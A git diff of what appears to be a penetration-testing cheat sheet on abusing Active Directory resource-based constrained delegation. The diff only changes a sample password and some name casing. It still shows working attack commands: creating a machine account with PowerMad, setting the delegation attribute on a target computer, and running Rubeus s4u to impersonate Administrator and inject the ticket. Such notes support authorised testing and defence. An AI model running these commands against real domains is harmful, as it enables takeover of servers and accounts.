@@ -114,7 +114,7 @@ To perform the delegation, we ultimately need the TGT of the principal (**machin
 - A more often-seen attack to RBCD is when we have *GenericWrite, GenericAll, WriteProperty, or WriteDACL* permissions to a computer object in the domain. This means we can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.
 1. Create a new machine account using PowerMad: 
 ```
-New-MachineAccount -MachineAccount NewMachine -Password $(ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)
+New-MachineAccount -MachineAccount NewMachine -Password $(ConvertTo-SecureString 'P@ssword123' -AsPlainText -Force)
 ```
 2. Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target:
 ```
@@ -126,7 +126,7 @@ Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedto
 ```
 4. Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target:
 ```
-.\Rubeus.exe s4u /user:NewMachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv.targetdomain.com /ptt
+.\Rubeus.exe s4u /user:newmachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/targetsrv.targetdomain.com /ptt
 ```
 
 -----------------------------------------------------
